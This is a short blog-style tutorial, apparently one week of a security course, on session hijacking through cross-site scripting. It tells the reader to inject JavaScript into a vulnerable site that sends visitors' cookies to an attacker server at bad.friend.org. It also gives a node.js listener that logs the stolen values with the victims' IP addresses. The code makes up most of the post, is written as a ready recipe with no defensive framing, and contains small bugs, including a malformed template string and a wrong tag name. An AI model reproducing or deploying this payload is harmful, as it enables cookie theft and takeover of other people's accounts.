---
layout: post
title: Session Hijacking
subtitle: Week 19 - data theft over the Internet
tags: [XSS, node, exploit]
---

Previously, we have demonstrated how to use ARP poison attacks to compromise unencrypted communication on local area networks (LAN). The attacks described below are effective over HTTPS traffic from external networks.

# Cookie Stealing

First, you must create an entry point on the vulnerable website with cross-site scripting. Force clients to establish a connection with your server.

## JavaScript Injection

For the code snippet below, we assume your server is accessible at the domain `bad.friend.org`.

{% highlight javascript linenos %}

let yourCookie = encodeURI(document.cookie);

// retrieve an image from the server, but send the victim's cookies as well.
let url = `http://bad.friend.org/picture.jpg?$yourCookies={yourCookie}`;
document.getElementsByTagName('image')[0].src = url;

// AJAX - Unnoticed by the typical user, low-profile payload
url = `http://bad.friend.org/gimmie?yourCookies=${yourCookie}`;
let xhr = new XMLHttpRequest();
xhr.open('GET', url, true);
xhr.send();

{% endhighlight %}

## Basic node.js Server

This is a minimal node.js server that prints HTTP request parameters to standard output.

{% highlight javascript linenos %}

const http = require('http');

http.createServer((req, res) => {

  let i = req.url.indexOf('?');
  if (i !== -1)
    console.log(req.connection.remoteAddress + ' ' + req.url.substring(i));

  res.end('thanks buddy\n');
}).listen(process.env.PORT || 8125);

{% endhighlight %}
